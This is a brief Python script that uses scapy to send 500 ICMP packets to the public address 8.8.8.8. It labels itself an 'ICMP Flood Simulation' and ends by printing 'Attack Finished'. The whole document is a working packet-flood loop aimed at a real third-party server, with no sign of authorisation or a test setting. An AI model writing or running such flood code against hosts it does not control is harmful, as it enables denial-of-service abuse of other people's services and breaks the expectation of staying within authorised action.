from scapy.all import *

target_ip = "8.8.8.8"

print("Starting ICMP Flood Simulation")

for i in range(500):
    packet = IP(dst=target_ip)/ICMP()
    send(packet, verbose=False)

print("Attack Finished")